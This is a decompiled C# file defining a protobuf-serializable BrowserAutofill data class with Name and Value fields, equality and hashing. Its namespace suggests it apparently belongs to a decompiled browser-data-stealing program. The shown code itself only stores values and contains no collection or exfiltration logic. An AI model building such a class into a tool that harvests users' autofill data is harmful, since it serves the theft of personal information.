using System;
using System.Collections.Generic;
using System.ComponentModel;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x0200015E RID: 350
	[ProtoContract(Name = "BrowserAutofill")]
	public class BrowserAutofill : INotifyPropertyChanged, IEqualityComparer<BrowserAutofill>
	{
		// Token: 0x170002B8 RID: 696
		// (get) Token: 0x06000B1B RID: 2843 RVA: 0x0000883C File Offset: 0x00006A3C
		// (set) Token: 0x06000B1C RID: 2844 RVA: 0x00008844 File Offset: 0x00006A44
		[ProtoMember(1, Name = "Name")]
		public string Name
		{
			get
			{
				return this._name;
			}
			set
			{
				this._name = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Name"));
			}
		}

		// Token: 0x170002B9 RID: 697
		// (get) Token: 0x06000B1D RID: 2845 RVA: 0x00008868 File Offset: 0x00006A68
		// (set) Token: 0x06000B1E RID: 2846 RVA: 0x00008870 File Offset: 0x00006A70
		[ProtoMember(2, Name = "Value")]
		public string Value
		{
			get
			{
				return this._value;
			}
			set
			{
				this._value = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Value"));
			}
		}

		// Token: 0x1400001A RID: 26
		// (add) Token: 0x06000B1F RID: 2847 RVA: 0x000229B8 File Offset: 0x00020BB8
		// (remove) Token: 0x06000B20 RID: 2848 RVA: 0x000229F0 File Offset: 0x00020BF0
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x06000B21 RID: 2849 RVA: 0x00008894 File Offset: 0x00006A94
		public bool Equals(BrowserAutofill x, BrowserAutofill y)
		{
			return x.Name == y.Name && x.Value == y.Value;
		}

		// Token: 0x06000B22 RID: 2850 RVA: 0x00022A28 File Offset: 0x00020C28
		public int GetHashCode(BrowserAutofill obj)
		{
			int num = 37;
			num *= 397;
			if (!string.IsNullOrEmpty(obj.Name))
			{
				num += obj.Name.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Value))
			{
				num += obj.Value.GetHashCode();
			}
			return num;
		}

		// Token: 0x04000443 RID: 1091
		private string _name;

		// Token: 0x04000444 RID: 1092
		private string _value;
	}
}
